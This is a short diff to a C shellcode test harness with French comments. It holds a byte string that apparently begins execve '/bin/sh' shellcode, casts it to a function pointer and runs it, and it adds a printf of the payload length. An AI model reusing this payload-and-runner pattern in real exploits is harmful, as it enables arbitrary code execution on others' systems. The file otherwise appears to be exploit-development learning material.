@@ -1,4 +1,3 @@
-
 #include <stdio.h>
 #include <string.h>
 
@@ -6,6 +5,7 @@ char code[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\
 
 int main(int argc, char **argv)
 {
+	printf("Lenght shellcode : %d\n",strlen(code));
         int (*func)(); // déclare un pointeur de fonction pour une fonction, arguments non spécifiés et retourne un int
         func = (int (*)()) code; // initialise le pointer en le faisant pointer sur code
         (int)(*func)(); // appel de fonction
